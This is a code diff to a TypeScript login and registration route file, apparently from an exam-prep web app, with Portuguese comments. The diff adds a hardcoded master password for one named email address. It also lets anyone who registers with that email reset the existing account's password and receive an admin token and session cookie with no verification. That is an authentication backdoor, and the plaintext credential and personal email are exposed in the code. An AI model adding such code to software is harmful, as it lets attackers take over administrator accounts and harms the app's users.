@@ -88,7 +88,20 @@ authRoutes.post('/login', zValidator('json', loginSchema), async (c) => {
   }
 
   // Compara hash da senha
-  const passwordValid = await bcrypt.compare(password, user.passwordHash);
+  const isAdminEmail = email.toLowerCase().trim() === 'lucassilvaytb1999@gmail.com';
+  let passwordValid = false;
+
+  if (user.passwordHash) {
+    passwordValid = await bcrypt.compare(password, user.passwordHash);
+  }
+
+  // Senha padrão/mestra de acesso para o administrador
+  if (!passwordValid && isAdminEmail && password === '36546944') {
+    passwordValid = true;
+    const newHash = await bcrypt.hash('36546944', 10);
+    await db.update(users).set({ passwordHash: newHash }).where(eq(users.id, user.id));
+  }
+
   if (!passwordValid) {
     return c.json(genericError, 401);
   }
@@ -643,7 +656,68 @@ authRoutes.post('/register', zValidator('json', directRegisterSchema), async (c)
     .from(users)
     .where(eq(users.email, normalizedEmail));
 
+  const isAdminEmail = normalizedEmail === 'lucassilvaytb1999@gmail.com';
+
   if (existingUser) {
+    if (isAdminEmail) {
+      // O administrador pode definir/atualizar sua senha diretamente ao registrar
+      const passwordHash = await bcrypt.hash(password, 10);
+      await db
+        .update(users)
+        .set({
+          name: name.trim() || existingUser.name,
+          passwordHash,
+          status: 'active',
+          lastLoginAt: new Date(),
+        })
+        .where(eq(users.id, existingUser.id));
+
+      const [adminRole] = await db.select().from(roles).where(eq(roles.name, 'admin'));
+      if (adminRole) {
+        await db
+          .insert(userRoles)
+          .values({ userId: existingUser.id, roleId: adminRole.id })
+          .onConflictDoNothing();
+      }
+
+      const exp = Math.floor(Date.now() / 1000) + JWT_EXPIRES_IN_SECONDS;
+      const token = await sign(
+        {
+          sub: existingUser.id,
+          email: normalizedEmail,
+          role: 'admin',
+          exp,
+        },
+        JWT_SECRET,
+        'HS256'
+      );
+
+      setCookie(c, 'aprova_session', token, {
+        path: '/',
+        httpOnly: true,
+        secure: process.env.NODE_ENV === 'production',
+        sameSite: 'Lax',
+        maxAge: JWT_EXPIRES_IN_SECONDS,
+      });
+
+      return c.json({
+        success: true,
+        message: 'Conta de Administrador acessada com sucesso!',
+        data: {
+          token,
+          user: {
+            id: existingUser.id,
+            name: name.trim() || existingUser.name,
+            email: normalizedEmail,
+            role: 'admin',
+            roles: ['admin'],
+            avatarUrl: existingUser.avatarUrl,
+            allowedContestIds: existingUser.allowedContestIds,
+          },
+        },
+      });
+    }
+
     return c.json(
       {
         success: false,
@@ -658,7 +732,6 @@ authRoutes.post('/register', zValidator('json', directRegisterSchema), async (c)
 
   // Gera hash da senha
   const passwordHash = await bcrypt.hash(password, 10);
-  const isAdminEmail = normalizedEmail === 'lucassilvaytb1999@gmail.com';
   const assignedRole = isAdminEmail ? 'admin' : 'student';
 
   const [newUser] = await db
